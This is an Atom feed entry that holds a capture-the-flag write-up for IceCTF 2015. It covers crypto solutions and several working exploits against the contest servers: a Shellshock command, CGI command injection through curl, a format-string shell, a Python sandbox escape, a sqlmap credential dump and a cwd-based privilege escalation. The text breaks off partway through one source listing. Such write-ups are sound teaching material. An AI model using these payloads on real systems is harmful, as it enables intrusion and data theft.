<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Icectf | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/icectf/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:29:03+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ICEC.TF Writeup]]></title>
    <link href="http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/"/>
    <updated>2015-08-24T13:31:45+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup</id>
    <content type="html"><![CDATA[<h2>ROT13</h2>

<p>{% codeblock %}
$ python
Python 2.7.6 (default, Sep  9 2014, 15:04:36)</p>

<blockquote><blockquote><blockquote><p>import codecs
codecs.encode(&lsquo;V srry yvxr guvf vf n tbbq cynpr gb fgber nyy zl frpher syntf. Vasnpg, urer&#39;f gur synt: ebg_13_vfag_frpher&rsquo;, &lsquo;rot13&rsquo;)
&ldquo;I feel like this is a good place to store all my secure flags. Infact, here&rsquo;s the flag: rot_13_isnt_secure&rdquo;
{% endcodeblock %}</p></blockquote></blockquote></blockquote>

<h2>Cryptic Crypto</h2>

<p>For substitution cipher: <a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a></p>

<h2>Statistics</h2>

<p>{% codeblock lang:python %}</p>

<h1>!/usr/bin/env python</h1>

<p>from pwn import *
from numpy import mean
import re</p>

<p>def process(command, nums):
    try:
        converted = map(int, re.split(r&#8217;\s+&lsquo;, nums.rstrip()))
    except:
        pass</p>

<pre><code>if 'maximum' in command:
    return str(max(converted))
if 'minimum' in command:
    return str(min(converted))
if 'sum' in command:
    return str(sum(converted))
if 'average' in command:
    return str(mean(converted))
</code></pre>

<p>r = remote(&lsquo;vuln2015.icec.tf&rsquo;, 9000)
t = Timeout()
t.timeout = 0.05</p>

<p>while True:
    nums = r.recvline()
    print nums
    sleep(0.05)
    command = r.recv()
    sleep(0.05)
    print command
    answer = process(command, nums)
    r.sendline(answer)
{% endcodeblock %}</p>

<h2>Ryan Gooseling</h2>

<p>{% codeblock %}
binwalk + scalpel (uncommenting jpg)
{% endcodeblock %}</p>

<h2>SHARKNADO!</h2>

<p>{% codeblock %}
root@kali32:~# tcpick -C -yU -r  sharknado.pcap  | grep -i admin
username=admin&amp;password=IAmALittlePasswordShortAndStout
{% endcodeblock %}</p>

<h2>Farm Animals</h2>

<p><a href="https://en.wikipedia.org/wiki/Pigpen_cipher">https://en.wikipedia.org/wiki/Pigpen_cipher</a></p>

<h2>RSA</h2>

<p>{% codeblock lang:python %}
N = 0xc8283502d6ed4c723078d5ddd299c67deaef48ca2d8cdce64f99fe50ee5705705ab25c220ba6a1521c068016aab51f5139962bf8362f8b5ea157fc3ecefebe6dec216ba655c3f2b1538907182760ffde203bbed8e0a41bc833e94369e631b7a559f71e7ed773f029b82f46fbb0842f898048e45e15330b6671a8dbda59b025eb
e = 65537
p = 0xf51d59442bd9c0e3d7e51e54ae8c46a3e1bce33a1b38b4fbea26803de37475b0d1702431966d058327a629ce3af3321b06e6be4a9c9671e02f488405c9e91c71
q = 0xd10bbefe61fe293d45a0bd3266429c461977237838677bee06fe3ed051eb0b36828e627126239121913d4324029fb601b456c33863c9fa7bfa0ce85ff427861b
d = 0xd490debb8545be4a06f04d30a6d868d4910c4e6168be905a876f23870f979b4f17031495938a0309107a56cdbbbd5ee5042357cee2bcdb6644330cd02744a336779ca1f2f5fed59951c34c216577870841cb50e6a01be8f2e23591db4e8df1551d4245049c0996a887f82636a2bb5aff48c42ed83be4f2c218cd83307395941
c = 0x1dca210d36fb700e0fe41e951216b89c4cf10a4d4feeeac92722184a8d1e1306da36002bef27e9f0ec3b3256e821cfd0f7220930ac3d71a9fb981e9ad5ef3713b57ec78bfd4a96d53c7b0ad9e3698deef5ba10486da5936b60768c7275bb57ee67bc832ad954ee0c38124bc9518bf84d2fe76b16036d51071d307d6d23fe19ad</p>

<p>decrypted = Mod(c, N) ** d</p>

<h1>encrypt: c = pow(m, e, N)</h1>

<h1>decrypt: m = pow(c, d, N)</h1>

<p>flag = hex(Integer(decrypted)).decode(&lsquo;hex&rsquo;)
print(flag)
{% endcodeblock %}</p>

<p>{% codeblock %}
$ ./sage /tmp/rsa1.sage
flag_dont_you_just_love_rsa
{% endcodeblock %}</p>

<h2>Shocked!</h2>

<p>{% codeblock %}
$ ssh -p 2022 <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#99;&#116;&#102;&#64;&#118;&#117;&#108;&#x6e;&#x32;&#48;&#49;&#53;&#46;&#x69;&#x63;&#101;&#x63;&#x2e;&#116;&#102;">&#x63;&#x74;&#x66;&#64;&#118;&#117;&#108;&#110;&#50;&#x30;&#x31;&#53;&#x2e;&#x69;&#99;&#x65;&#x63;&#x2e;&#116;&#x66;</a> &lsquo;() { :;}; cat flag.txt&rsquo;
<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x63;&#116;&#102;&#64;&#x76;&#x75;&#x6c;&#x6e;&#x32;&#x30;&#49;&#53;&#x2e;&#x69;&#x63;&#101;&#x63;&#46;&#116;&#102;">&#99;&#x74;&#x66;&#x40;&#x76;&#x75;&#108;&#110;&#x32;&#x30;&#49;&#x35;&#x2e;&#105;&#x63;&#x65;&#x63;&#46;&#116;&#x66;</a>&rsquo;s password:
The flag is: shocking_the_shellz_is_fun
{% endcodeblock %}</p>

<h2>Hackers in disguise</h2>

<p>I have found the solution for the almost same <a href="http://ehsandev.com/pico2014/web_exploitation/make_a_face.html">challenge</a>, more information
abouth the vulnerability <a href="http://www.cgisecurity.com/lib/sips.html">here</a>.</p>

<p>{% codeblock %}
root@kali32:~# vector=$(ruby -e &lsquo;print &ldquo;;ls -la|&rdquo;.split(//).map{|x| &ldquo;%&rdquo; + x.ord.to_s(16)}.join&rsquo;)</p>

<p>root@kali32:~# curl &ldquo;<a href="http://disguise.icec.tf/disguise.cgi?Hacker=$">http://disguise.icec.tf/disguise.cgi?Hacker=$</a>{vector}&amp;Mustache=3.bmp&amp;Shades=3.bmp&rdquo;
@MPAp)    xxx007 ECRT_KY_19DF8876272F766DE58C5EA5
rwx-xrx 2100 101  096Aug 6 2:4 cs
-rxr-r-x1 101 001  47 Ag   1249 isgisecgi-rwr&mdash;-  101 101 514 Au  614:2 dsguse.tmldrwr-x-x  101 101 409 Au  612:9 fnt
rw&mdash;r- 1100 101 5738Aug 6 2:4 h1bmp-rwr&mdash;-  101 101 473 Au  612:9 h.bm
-r-r-r&ndash;1 101 0015478 Ag   1249 3.bp
-wxrxr- 1 001100   44 ug 6 1:29indx.ci
-w-r-r- 1 001100  201 ug 6 1:13indx.hml
rwx-xrx 2100 101  096Aug 6 5:1 js-rwr&mdash;-  101 101 473 Au  612:9 m.bm
-r-r-r&ndash;1 101 0015478 Ag   1249 2.bp
-w-r-r- 1 001100 5438 ug 6 1:49m3.mp
rw&mdash;r- 1100 101 5738Aug 6 2:4 s1bmp-rwr&mdash;-  101 101 473 Au  612:9 s.bm
-r-r-r&ndash;1 101 0015478 Ag   1249 3.bp
-w-r-r- 1 001100 5438 ug 6 1:49s4.mp</p>

<p>root@kali32:~# curl &ldquo;<a href="http://disguise.icec.tf/disguise.cgi?Hacker=$">http://disguise.icec.tf/disguise.cgi?Hacker=$</a>{vector}&amp;Mustache=${vector}&amp;Shades=${vector}&rdquo;
total 604
drwxr-xr-x 5 1001 1001  4096 Aug  6 23:21 .
drwxr-xr-x 6 1001 1001  4096 Aug  6 13:28 ..
-rw-r&ndash;r&ndash; 1 1001 1001    38 Aug  6 14:07 SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5
drwxr-xr-x 2 1001 1001  4096 Aug  6 12:49 css
-rwxr-xr-x 1 1001 1001   437 Aug  6 12:49 disguise.cgi
-rw-r&ndash;r&ndash; 1 1001 1001  5140 Aug  6 14:12 disguise.html
drwxr-xr-x 3 1001 1001  4096 Aug  6 12:49 font
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 h1.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 h2.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 h3.bmp
-rwxr-xr-x 1 1001 1001   144 Aug  6 13:29 index.cgi
-rw-r&ndash;r&ndash; 1 1001 1001  2801 Aug  6 14:13 index.html
drwxr-xr-x 2 1001 1001  4096 Aug  6 15:16 js
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 m1.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 m2.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 m3.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 s1.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 s2.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 s3.bmp
-rw-r&ndash;r&ndash; 1 1001 1001 54738 Aug  6 12:49 s4.bmp</p>

<p>root@kali32:~# vector=$(ruby -e &lsquo;print &ldquo;;cat SECRET_KEY_159DF48875627E2F7F66DAE584C5E3A5|&rdquo;.split(//).map{|x| &ldquo;%&rdquo; + x.ord.to_s(16)}.join&rsquo;)
root@kali32:~# curl &ldquo;<a href="http://disguise.icec.tf/disguise.cgi?Hacker=$">http://disguise.icec.tf/disguise.cgi?Hacker=$</a>{vector}&amp;Mustache=${vector}&amp;Shades=${vector}&rdquo;
flag_why_did_we_stop_using_perl_again
{% endcodeblock %}</p>

<h2>Fermat</h2>

<p>{% codeblock %}
[ctf-7119@icectf-shell /home/fermat]$ ./fermat &ldquo;$(python -c &lsquo;print &rdquo;\x2c\xa0\x04\x08       %135$1326x%135$n&#8221;&rsquo;)&ldquo;
, sh-4.2$ id
uid=1148(ctf-7119) gid=1021(fermat) groups=1002(ctf) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ cat flag.txt
flag_fermats_last_exploit
{% endcodeblock %}</p>

<h2>Barista</h2>

<p>Similarly like in <a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/objection">Hack.lu CTF 2014: Objection</a>, we overwroted the <code>getter</code> function for <code>is_admin</code>:</p>

<p>Vulnerable line:
{% codeblock lang:javascript %}
    # Check that the coffee exists
    if (coffee[name]? and
            name not in [&ldquo;rebrew&rdquo;, &ldquo;cleanup&rdquo;] and
            typeof coffee[name] is &ldquo;function&rdquo;)
{% endcodeblock %}</p>

<p>{% codeblock %}
<a href="http://coffee.icec.tf/__defineGetter__?args=is_admin">http://coffee.icec.tf/__defineGetter__?args=is_admin</a>
&hellip;
undefined + flag_i_dont_even_like_coffee_but_i_love_coffeescript
{% endcodeblock %}</p>

<h2>PyShell</h2>

<p>Similar as here: <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>

<p>{% codeblock %}
$ nc vuln2015.icec.tf 8000
Welcome to my Python sandbox! Enter commands below! Please don&rsquo;t mess up my server though :/</p>

<blockquote><blockquote><blockquote><p>[].<strong>class</strong>
[].<strong>class</strong>.<strong>base</strong>
print([].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]</p>

<p>print([].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>().index(file))
Traceback (most recent call last):
  File &ldquo;./problem.py&rdquo;, line 37, in <module>
    exec data
  File &ldquo;<string>&rdquo;, line 1, in <module></p></blockquote></blockquote></blockquote>

<p>$ nc vuln2015.icec.tf 8000
Welcome to my Python sandbox! Enter commands below! Please don&rsquo;t mess up my server though :/</p>

<blockquote><blockquote><blockquote><p>f = [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[40]
f(&lsquo;./flag.txt&rsquo;).read()
print(f(&lsquo;./flag.txt&rsquo;).read())
The flag is: not_your_average_python
{% endcodeblock %}</p></blockquote></blockquote></blockquote>

<h2>Entropy</h2>

<p>We have the python daemon, that uses only a few primes (they are stored in text file and keys are generated almost instantly).</p>

<p>In the challenge information is provided public key <code>(N, e = 257)</code> and encrypted data <code>c</code>, that we want to decrypt:</p>

<p>{% codeblock %}
27134539740327372277016096853435890120677470119612424124869327819124029912990004448750434621403418542927781194142877244503562989100969794546726189679434973051199593686324469650695332464843866317242833309989642047675838763945117051708685755516681732600344477784607819725824461400081264484810830802070160626494750360668977494105105567529042035493471083490134591723283745502956169145544321430921932449188900918387414900628355258180161727963712905333194811283381016749488185293777854150520335564364850062292655420041681761888247884838176822010929853437116012249823316297480912216876461230774949536318942112650569572741229</p>

<p>21833706562424363526758144595528139378681868374355612924041399984966569709971402846162543351650992393259625378308766376918010037809411868937951264540233547911616955412668210947953666054174014762004709853178682474885483298510115565509957726137783160293746001217719965940995344574478555209182195121905187551848171141764244076996783305517744086819333014890572868236912842045064036434736842358851218773925473983781900791489911542650152543840593725659311233554355918780080457663947286285012785980160999737442977651996204521503213470778632213967510707131516893141063362768682472114553632059355826524352103299651991899005722
{% endcodeblock %}</p>

<p>After fetching a few public keys, using information from the <a href="https://www.hyperelliptic.org/tanja/vortraege/facthacks-29C3.pdf">presentation</a> and <a href="http://facthacks.cr.yp.to/fermat.html">source</a>, we want to find the common primes.</p>

<p>{% codeblock lang:python entropy.sage %}
def product(X):
        if len(X) == 0: return 1
        while len(X) > 1:
                X = [prod(X[i<em>2:(i+1)</em>2]) for i in range((len(X)+1)/2)]
        return X[0]</p>

<p>def producttree(X):
        result = [X]
        while len(X) > 1:
                X = [prod(X[i<em>2:(i+1)</em>2]) for i in range((len(X)+1)/2)]
                result.append(X)
        return result</p>

<p>def remaindersusingproducttree(n,T):
        result = [n]
        for t in reversed(T):
                result = [result[floor(i/2)] % t[i] for i in range(len(t))]
        return result</p>

<p>def remainders(n,X):
        return remaindersusingproducttree(n,producttree(X))</p>

<p>def batchgcd_simple(X):
        R = remainders(product(X),[n<sup>2</sup> for n in X])
        return [gcd(r/n,n) for r,n in zip(R,X)]</p>

<p>def batchgcd_faster(X):
        prods = producttree(X)
        R = prods.pop()
        while prods:
                X = prods.pop()
                R = [R[floor(i/2)] % X[i]**2 for i in range(len(X))]
                return [gcd(r/n,n) for r,n in zip(R,X)]</p>

<h1>first line is our public key</h1>

<p>print batchgcd_simple(
        [0xd6f26be4d627833b8eb7886d4234a99a391f2b14dfed53decda8a238043c8590ebd2561bebf508626fea71e1c5b912a3e6e1b1a1ad378ed778edd4c6d1269b51d263525b0850e95c5dc355846705f231c2a38744b6fea488df00cc23d9977cb6bfbde80b43314c09d3d65ffa48f566acce4bfc4c9f9d1acb4601af41f15957add7601d4828e2f30be1b2f98d4cba2f81e25738d5ba39e842372b301d1959ed8f704e457bc0f88882c8a3a9817a60d0b5960fe5f6ae17b1b2794ca51f0330c531fc5c19d8330341c7228cf794c0769fc91030f9b33855421ce3e78291d740754c91c2ecf591d0649875b1d6d18b03558b693d1742aadb41b1c949ba4fbbd8f06dL,
        0xd8b23baf97e9cf1faa4c6918b84e51b53e5ce25d93a39cbc4ac033bfb2a91110ee8ea872f3151f936f4b42c0b16065dc39d813a53914c5fccf86c3385e215fea90c7d2df09f62527b3a723baf0ef2937056cd8b02cd519b6da339a9d4744a6b5112aa5b49238bd52c56300dca61cfe3bc6401e2b6cbbce73dfab863ce847180c9a57a5ea80c40b0d164ba99ce96409b816b01574ecf938d3f2fe9f164ad6182c7e46a85127dd1faa7e35588fabfd155cf432514d6a3a5fc59ab55dd9a6923572f6de43745254ce8829f2c3f23198b364502d6173efc7fa714c39551e5551a2e79624f26da82e4a41ab2ea1607098f93ed62743e392d23694ae16ba5fec8aacf5, \
        0xe5ea8b1bcf376af0c1917be870fa147eab872224c21c9cfe87498ee7fd311c72fca829cf10b418e1ff3820237796010131e39982a79f947c4dfd923b2c999acaa39525e712b92b10563a558103bd9836d811cb7c163705ce87b0c05d3805479868626f2d1723d85a52fb06de7c9a073e697fd05137fa0ed135fba7bd35bc5d12b2415ffbd7505966dd05d1e39202275be3125fe5a5cdb192e9d616ea2009df88b632360aeb8a9a460b5dbbc4e189857d39aace108e6bd1e77f2113523544a35db6b71ba6506f585d7deed09218f7f11ec75007bbbfcafc0ac0853aeae5eb1db2e092eba82827ff38760983cf6d5e20531222a3e8826b8f751f50fb78e34437bd, \
        0xc439ed4afac3a78066a3a52202541480b3a400b4fb5710d0032cb23cf5570ef858735d5b6e41393f3abadee2241614a666da9ff98585f32deb82e64adf94da4627f515d7e2001b78157473266bada53f069d8930761a9b56b74153f43607b38f75642a3cdcdd8c299bae8275acbf8041edab88153a7c917b80b57d722882afe3988d93f9e479352a0c87fa04f49175446f4360ed011a99172c4038629f5030a2f6a2801fe338ee323fd760dfda8a4b245126c8ce62c1dc2bc1a47ba14d95f99d34ae566c5b1779134429c083913405040a58593cfb08b4f5a19f6e4c471a1a272321423784e8fe7611a18a0369b14dbd532195e1e81e74c739fb5eb291197b21,
        0x9d53d7b6c1a3ef1a62a33100de2e96ae8d80642b35cb525f4b7a1d0f7336037bb2c1cc73cbfe4dbc4fe7aa61c9afc78b8f5f78d2a851a47a029b2c74117c2022c875093a8243f500ed5c096f90022b6030e0a1ecbef352504e0b447df09eeebb8c26676b8c4615b8f05b96c884fce4e9e8149e520e65bce6e5e0f8a60c2fa436003cc53fd768ae8b67c1b753569b7c8888aff4a365c027dab77c699d687aea9e606b82238e760f409b2bae7f857c6d52b61e11e964f4cf2de08841c3e13cfa68dc3fd9e60cd020cc078517acd95c51cdc39fdeca354a051cdac8e9e81917808de76830e60d6be18f014221ba5b61e701ea7e8f3240c2182f14bbd89afe94f2dd,
        0xd5b9121c986c03839a6f8f5633e8be53539c7c4b4ea227353dd347b1846d4210300a0646ec6644b3e0926c0e12b9db551685fea310dfd124778893f3a919a3e9a6957e797e8d417c749d295817f99f76ea7e3ac829ac7497fb66673f5e5de453354f2b252769ea71305b6332ba502538ca6ef9023166da519f826a61978f89cadaa3c7b3aba8acc430d7918ea84158eff4c04bdd6a09bf1f358c6e42d101e6cdb205a70ad38f546b7efec13c4b1d7c28c89934ab4ee139117a2c804ac16ad79c435e290da270fb9e2b66e1b7a28f3ff18e0295138946291f81c9088aec97c2991ddd1a641b98685e8e4aecf8d3a41c766f674d8fb44d0fc4fb0770be3c4f7bd1,
        0x99f5b356fe0ee4d5f2547c07e7d37eaf451ff54663a4623527ffe9cced2924bc3da53384dd609fd4c80cb76893ef1ffc7b45c1226449e665236d9e9c83ca7adea9c4b0331217af4c17ec4152b288a83dbc4b9c60f22d7a2f49f901c5e09f99fa834923505954ef9fc48b11a97a58a0fce38f9d980a017b5aa005d81c85be0fea138476540812a602dc5e5ca4dd7ef411a185dad805f43ae3431b627c88b8f1d8e59c363a70c17c3b1ea9e25a25a1b8e935b1c7c5356103a309db094b5454f281f2cce84a0e981a5ea2e5e34e7eac3fcaeb5eec48c5583bf35ef1e98967111472b8055847c5cc498d3807cb97ae0234e25dc016e47ae9b765b9d0db9998882cb9,
        0xe02e1fb7464295424b8781f2cd600ddbbd57c785a45c9ca29350a3016afd5f7976f5bd475b101cd1072e21dd5c864a9f9419a2a0ac3b68f4f0649d28771597ae5eb906600636f4cc9ca0357bb7be85bc9593ad5814a4ed2964367ad9a9f90974b6172973f6c27d6d7e9b14f880ca12eb25ecab5d60bc4b0b2e4bbfa3ad6214b8b1d0fa250dc8e20d433b20a8d9e90cb3532e50f2ef0c8a693e9e9443d3cd4b83308144c5bd448865649e74ae37e5fcefaf0ee57096959a6fa4fcbe65f4bec364a7defb5329a8da93977fa121c51b13a3772e79b8dba393a4156611fcd1795e2fceb3d0e6b5facb7b7341b2da63caa167307060797b274e8812499fb9c8160375
])
{% endcodeblock %}</p>

<p>{% codeblock %}
$ ./sage /tmp/entropy.sage

{% endcodeblock %}</p>

<p>Because the <code>174530909087014...</code> value is divisible by our public key, we were able to factor it and we got <code>q = N / p</code>.</p>

<p>{% codeblock lang:python solution.sage %}
N = 27134539740327372277016096853435890120677470119612424124869327819124029912990004448750434621403418542927781194142877244503562989100969794546726189679434973051199593686324469650695332464843866317242833309989642047675838763945117051708685755516681732600344477784607819725824461400081264484810830802070160626494750360668977494105105567529042035493471083490134591723283745502956169145544321430921932449188900918387414900628355258180161727963712905333194811283381016749488185293777854150520335564364850062292655420041681761888247884838176822010929853437116012249823316297480912216876461230774949536318942112650569572741229
c = 21833706562424363526758144595528139378681868374355612924041399984966569709971402846162543351650992393259625378308766376918010037809411868937951264540233547911616955412668210947953666054174014762004709853178682474885483298510115565509957726137783160293746001217719965940995344574478555209182195121905187551848171141764244076996783305517744086819333014890572868236912842045064036434736842358851218773925473983781900791489911542650152543840593725659311233554355918780080457663947286285012785980160999737442977651996204521503213470778632213967510707131516893141063362768682472114553632059355826524352103299651991899005722
p = 174530909087014716115113368365080232735669872304657503181040399565409510763517957093840008899869814249462343244523157586287119841547254547568826577936318168641266138819124651861211744771083886615905360155208773780746504047920299202268833418863547500887620241823421979548067336758574000690763023308648146612727
q = N / p
e = 257</p>

<p>phi = (p - 1) * (q - 1)
bezout = xgcd(e, phi);
d = Integer(mod(bezout[1], phi))</p>

<h1>mod(d * e, phi) == 1</h1>

<p>decrypted = Mod(c, N) ** d</p>

<p>flag = hex(Integer(decrypted)).decode(&lsquo;hex&rsquo;)
print(flag)
{% endcodeblock %}</p>

<p>{% codeblock %}
./sage /tmp/solution.sage
flag_keep_the_prime_count_high
{% endcodeblock %}</p>

<h2>Authorize</h2>

<p>Time-delay injection in register field, using POST method:</p>

<p>{% codeblock lang:php register.phps %}
&lt;?php
include &ldquo;config.php&rdquo;;
$con = mysqli_connect($MYSQL_HOST, &ldquo;authorize&rdquo;, &ldquo;authorize&rdquo;, &ldquo;authorize&rdquo;);
$username = $_POST[&ldquo;register&rdquo;];
$query = &ldquo;SELECT * FROM users WHERE username=&lsquo;$username&rsquo;&rdquo;;
$result = mysqli_query($con, $query);</p>

<p>if (mysqli_num_rows($result) !== 0) {
  die(&ldquo;Someone has already registered &rdquo; . htmlspecialchars($username));
}</p>

<p>die(&ldquo;Registration has been disabled.&rdquo;);
?></p>

<p>{% endcodeblock %}</p>

<p>To solve it quickly, we used sqlmap:</p>

<p>{% codeblock %}</p>

<h1>sqlmap  -u &ldquo;<a href="http://web2015.icec.tf/authorize/">http://web2015.icec.tf/authorize/</a>&rdquo; &ndash;forms -D authorize -T users &ndash;dump</h1>

<p>&hellip;
Database: authorize
Table: users
[1 entry]
+&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | username | password                    |
+&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| 1  | admin    | TogetherW3CanChangeTheWr0ld |
+&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
{% endcodeblock %}</p>

<p>{% codeblock %}
Logged in!</p>

<p>Your flag is: flag_binary_search_those_credentials
{% endcodeblock %}</p>

<h2>Elevate</h2>

<p>{% codeblock lang:c elevate.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int read_password(FILE <em>file, char </em>password, size_t n) {
    fgets(password, n, file);
    password[strcspn(password, &ldquo;\n&rdquo;)] = &lsquo;\0&rsquo;;
}</p>

<p>void elevated_shell(){
    gid_t gid = getegid();
    setresgid(gid,gid,gid);
    fflush(stdout);
    system(&ldquo;/bin/bash&rdquo;);
}</p>

<p>void regular_shell(){
    gid_t gid = getgid();
    setresgid(gid,gid,gid);
    fflush(stdout);
    system(&ldquo;/bin/bash&rdquo;);
}</p>

<p>int main(int argc, char **argv){</p>

<pre><code>char flag[100];
char password[100];
FILE *file;

printf("Hi! Welcome to my secure shell software!\n");

// Read in the root password
file = fopen("flag.txt", "r");
if(file == NULL) {
    printf("FAIL: Failed to open the password file\n");
    return -3;
} else {
    read_password(file, flag, sizeof(flag));
}

// Read in the user's password
printf("Please enter the password: ");
fflush(stdout);
read_password(stdin, password, sizeof(password));


if(strcmp(flag,password) == 0) {
    printf("Correct! Here's an elevated shell :)\n");
    elevated_shell();
} else {
    printf("Incorrect! No elevated shell for you &gt;:)\n");
    regular_shell();
}
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>Obviously, the <code>flag.txt</code> file is read, but from current working directory.</p>

<p>Solution:</p>

<p>{% codeblock %}
[ctf-7119@icectf-shell /home/elevate]$ cd /tmp
[ctf-7119@icectf-shell /tmp]$ mkdir .sine
[ctf-7119@icectf-shell /tmp]$ cd .sine
[ctf-7119@icectf-shell .sine]$ echo 1337 > flag.txt</p>

<p>[ctf-7119@icectf-shell .sine]$ /home/elevate/elevate
Hi! Welcome to my secure shell software!
Please enter the password: 1337
Correct! Here&rsquo;s an elevated shell :)</p>

<p>[ctf-7119@icectf-shell .sine]$ cat /home/elevate/flag.txt
flag_c21f22c6ff839828124be4f38677f7cf
{% endcodeblock %}</p>

<h2>Supernote</h2>

<p>Exploitable code:
{% codeblock lang:c supernote.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/stat.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;pwd.h></h1>

<h1>include &lt;curl/curl.h></h1>

<p>char *gethome() {
    return getpwuid(getuid())->pw_dir;
}</p>

<p>char <em>get_temp(){
    char </em>fname = tempnam(gethome(), &ldquo;ctf1_&rdquo;);
    struct stat buf;
    if(stat(fname, &amp;buf) >= 0) {
        fprintf(stderr, &ldquo;Temporary file exists!\n&rdquo;);
        exit(1);
    }
    fprintf(stderr, &ldquo;Temporary file is %s\n&rdquo;, fname);
    return fname;</p>

<p>}
void upload_note(char <em>email, char </em>name, char <em>msg) {
    CURL </em>curl;
    CURLcode res;
    char buf[1024];
    snprintf(buf, sizeof(buf), &ldquo;email=%s&amp;name=%s&amp;msg=%s&rdquo;, email, name, msg);</p>

<pre><code>curl_global_init(CURL_GLOBAL_ALL);

curl = curl_easy_init();
if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://web2015.icec.tf/supernote/index.php");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

    res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        exit(1);
    }

    curl_easy_cleanup(curl);
}
curl_global_cleanup();
</code></pre>

<p>}
void write_note(char <em>fname, char </em>str) {
    FILE *fd = fopen(fname, &ldquo;w&rdquo;);
    fputs(str, fd);
    fclose(fd);</p>

<pre><code>// Test version, keep things clean
unlink(fname);
</code></pre>

<p>}
int main(int argc, char <em><em>argv){
    char email[80];
    char name[80];
    char contents[500]; // That&rsquo;s a bit much, don&rsquo;t you think?
    char </em>ptr;
    char </em>tmpfile = get_temp();
    printf(&ldquo;Welcome to SuperNote v1.1.1.1.1.1.1.1.1.1. We&rsquo;re still in beta, so please excuse some bugs.\n&rdquo;);
    printf(&ldquo;Please enter your email address: &rdquo;);
    fgets(email, sizeof(email), stdin);
    email[sizeof(email)-1] = &lsquo;\0&rsquo;;
    email[strlen(email)-1] = &lsquo;\0&rsquo;;
